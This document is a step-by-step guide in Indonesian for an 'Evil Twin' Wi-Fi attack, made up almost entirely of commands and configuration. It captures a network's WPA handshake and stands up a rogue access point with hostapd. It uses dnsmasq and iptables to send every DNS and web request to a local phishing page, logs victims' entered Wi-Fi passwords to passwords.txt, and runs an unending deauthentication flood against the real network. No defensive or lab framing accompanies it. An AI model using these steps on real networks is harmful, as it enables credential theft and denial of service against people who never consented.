# Evil Twin Attack

## Instal Tools

```
apt-get update
apt-get install aircrack-ng hostapd dnsmasq iptables apache2 php libapache2-mod-php
```

## Langkah-Langkah

#### Aktifkan Mode Monitor pada Interface Deauth

```
airmon-ng check kill
airmon-ng start [interface_deauth]
```

#### Scan Wi-Fi WPA/WPA-PSK

```
airodump-ng --encrypt wpa [interface_deauth]
```

#### Capture 4-Way Handshake

```
airodump-ng --bssid [bssid] --channel [channel] --write [output] [interface_deauth]
```

#### Beri IP pada Interface AP

```
ip addr flush dev [interface_ap]
ip addr add 10.10.10.1/24 dev [interface_ap]
ip link set [interface_ap] up
```

#### Membuat Konfigurasi Hostapd

```
nano hostapd.conf
```

Isi dengan:

```
interface=[interface_ap]
driver=nl80211
ssid=[ssid]
hw_mode=g
channel=[channel]
auth_algs=1
ignore_broadcast_ssid=0
```

#### Membuat Konfigurasi DNSmasq

```
nano dnsmasq.conf
```

Isi dengan

```
interface=[interface_ap]
dhcp-range=10.10.10.2,10.10.10.10,255.255.255.0,12h
dhcp-option=3,10.10.10.1
dhcp-option=6,10.10.10.1
address=/#/10.10.10.1
no-resolv
log-dhcp
```

#### Konfigurasi NAT dan Port Forwarding dengan iptables

```
iptables -F
iptables -t nat -F
iptables -X
iptables -t nat -A PREROUTING -i [interface_ap] -p tcp --dport 80 -j DNAT --to-destination 10.10.10.1:80
iptables -t nat -A PREROUTING -i [interface_ap] -p udp --dport 53 -j DNAT --to-destination 10.10.10.1:53
iptables -A INPUT -i [interface_ap] -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -i [interface_ap] -p udp --dport 53 -j ACCEPT
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -t nat -L -n -v
```

#### Membuat Backup dan Atur Permission Direktori Web

```
mkdir /var/www/html/backup
mv /var/www/html/* /var/www/html/backup
chmod -R 755 /var/www/html
```

#### Salin File Web ke Direktori HTML

```
cp conf/index.html /var/www/html
cp conf/verifikasi.php /var/www/html
```

#### Salin File Capture ke Direktori Web dan Atur Permission

```
cp [output]-01.cap /var/www/html/
chown root:www-data /var/www/html/[output]-01.cap
chmod 640 /var/www/html/[output]-01.cap
```

#### Buat File passwords.txt dan Atur Permission

```
touch /var/www/html/passwords.txt
chown root:www-data /var/www/html/passwords.txt
chmod 660 /var/www/html/passwords.txt
```

#### Backup dan Ganti Konfigurasi Apache

```
cp /etc/apache2/sites-available/000-default.conf /etc/apache2/sites-available/000-default.conf.bak
cp conf/apache2.conf /etc/apache2/sites-available/000-default.conf
```

#### Aktifkan Modul Rewrite dan Restart Apache

```
a2enmod rewrite
systemctl restart apache2
```

#### Jalankan DNSmasq

```
dnsmasq -C dnsmasq.conf -d
```

#### Jalankan Hostapd

```
hostapd hostapd.conf
```

#### Monitoring Hasil

```
tail -f /var/www/html/passwords.txt
```

#### Jalankan Serangan Deauth

```
aireplay-ng -0 0 -a [bssid] [interface_deauth]
```
